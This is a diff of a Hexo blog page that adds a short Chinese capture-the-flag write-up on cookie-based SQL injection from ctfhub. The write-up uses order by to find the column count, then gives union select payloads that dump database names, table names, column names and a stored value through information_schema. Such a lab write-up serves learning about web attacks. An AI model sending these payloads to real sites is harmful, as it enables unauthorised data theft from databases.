@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>ctf |  b1xcy&#39;s blog</title>
+      <title>Cookie注入 |  b1xcy&#39;s blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -52,96 +52,181 @@
       
     <main class="content on">
       <section class="outer">
-  
-  
-  <article class="articles">
+  <article
+  id="post-Cookie注入"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
     
-    
-    <h1 class="page-type-title">ctf</h1>
-    
-    
-  
-  
-  
-  
-  
-  
-  <div class="archives-wrap">
-    <div class="archive-year-wrap">
-      <a href="/archives/2023" class="archive-year">2023</a>
-    </div>
-    <div class="archives">
-      
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2023/04/04/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/" class="archive-article-date">
-  <time datetime="2023-04-04T13:17:08.900Z" itemprop="datePublished">04/04</time>
-</a>
+    <header class="article-header">
        
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2023/04/04/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/"
-    >ctfshow愚人杯</a> 
-</h2>
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Cookie注入
+</h1>
  
 
+      
     </header>
-    
-      
+     
+    <div class="article-meta">
+      <a href="/2023/03/26/Cookie%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2023-03-26T13:55:06.871Z" itemprop="datePublished">2023-03-26</time>
+</a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
   </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">134</span>
+        </span>
+    </span>
 
-    
-    
-  </div>
-</article>
-      
-  
-  
-  
-  </div>
-  </div>
-  
-  
-  <div class="archives-wrap">
-    <div class="archive-year-wrap">
-      <a href="/archives/2022" class="archive-year">2022</a>
-    </div>
-    <div class="archives">
-      
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2022/11/21/2022%E7%BA%A2%E5%B2%A9%E6%96%B0%E7%94%9F%E6%9D%AF/" class="archive-article-date">
-  <time datetime="2022-11-21T07:04:57.708Z" itemprop="datePublished">11/21</time>
-</a>
-       
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2022/11/21/2022%E7%BA%A2%E5%B2%A9%E6%96%B0%E7%94%9F%E6%9D%AF/"
-    >2022红岩新生杯</a> 
-</h2>
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">1 分钟</span>
+        </span>
+    </span>
+</div>
  
-
-    </header>
-    
+    </div>
       
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a>
-  </div>
 
-    
-    
-  </div>
-</article>
-      
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>提示是cookie注入，随便发点cookie过去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262211721.png" alt="image-202303262211721"></p>
+<p>那就发cookie id过去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262214650.png" alt="image-20230326221312259"></p>
+<p>显然是普通的数字注入，order by尝试之后有两列</p>
+<p>那就用一般的联合注入union select</p>
+<p>构造id&#x3D;-1 union select 1,code查找</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262216303.png" alt="image-20230326221603268"></p>
+<p>已经成功注入了，看得出来数据库是sqli</p>
+<p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217257.png" alt="image-20230326221717225"></p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217179.png" alt="image-20230326221754150"></p>
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;gpdznzrugt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262218763.png" alt="image-20230326221827733"></p>
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,rgbrnkhfep from sqli.gpdznzrugt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262219457.png" alt="image-20230326221914424"></p>
+ 
+      <!-- reward -->
       
     </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/03/26/Cookie%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctfhub/" rel="tag">ctfhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
   </div>
-  
-  
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/04/04/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            ctfshow愚人杯
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/02/16/%E6%B8%97%E9%80%8F-W1R3S/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">渗透-W1R3S</div>
+      </a>
+    
+  </nav>
 
   
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
 </section>
       <footer class="footer">
   <div class="outer">
@@ -251,6 +336,22 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
 
 <script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
 <link
